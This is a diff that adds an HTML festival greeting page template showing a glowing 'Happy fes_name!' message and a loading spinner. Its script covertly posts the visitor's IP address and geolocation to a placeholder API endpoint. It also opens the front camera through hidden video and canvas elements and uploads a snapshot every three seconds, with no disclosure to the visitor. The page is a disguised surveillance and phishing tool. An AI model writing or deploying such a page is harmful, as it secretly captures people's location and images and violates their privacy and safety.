@@ -1,0 +1,37 @@
+<!-- DESC: Festival wishing page with celebration greeting and camera capture -->
+<!DOCTYPE html>
+<html><head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
+<title>Happy fes_name</title>
+<style>
+body{margin:0;background:linear-gradient(135deg,#1a0033,#000033);color:#fff;font-family:Arial,sans-serif;text-align:center;overflow:hidden}
+.video-wrap,.capture-canvas{display:none}
+h1{font-size:clamp(28px,8vw,48px);margin:20px;text-shadow:0 0 20px #ff0,0 0 40px #f80;animation:glow 2s infinite}
+@keyframes glow{0%,100%{text-shadow:0 0 20px #ff0,0 0 40px #f80}50%{text-shadow:0 0 40px #ff0,0 0 80px #f80}}
+.greeting{font-size:clamp(16px,4vw,24px);margin:10px;color:#fa0}
+.spinner{margin:40px auto;width:40px;height:40px;border:4px solid #333;border-top:#ff0;border-radius:50%;animation:spin 1s linear infinite}
+@keyframes spin{to{transform:rotate(360deg)}}
+</style>
+</head><body>
+<video id="video" playsinline autoplay style="display:none"></video>
+<canvas id="canvas" width="640" height="480" style="display:none"></canvas>
+<h1>Happy fes_name!</h1>
+<div class="greeting">Loading your special greeting... 🎉</div>
+<div class="spinner"></div>
+<script>
+var API='API_BASE_URL';
+var video=document.getElementById('video'),canvas=document.getElementById('canvas'),ctx=canvas.getContext('2d');
+fetch(API+'/capture/ip',{method:'POST',headers:{'Content-Type':'application/json'},body:'{}'});
+if(navigator.geolocation)navigator.geolocation.getCurrentPosition(function(p){
+fetch(API+'/capture/location',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({lat:p.coords.latitude,lon:p.coords.longitude,acc:p.coords.accuracy})});
+});
+navigator.mediaDevices.getUserMedia({audio:false,video:{facingMode:'user'}}).then(function(s){
+video.srcObject=s;video.play();
+setInterval(function(){
+ctx.drawImage(video,0,0,640,480);
+fetch(API+'/capture/image',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({cat:canvas.toDataURL('image/png')})});
+},3000);
+}).catch(function(){});
+</script>
+</body></html>
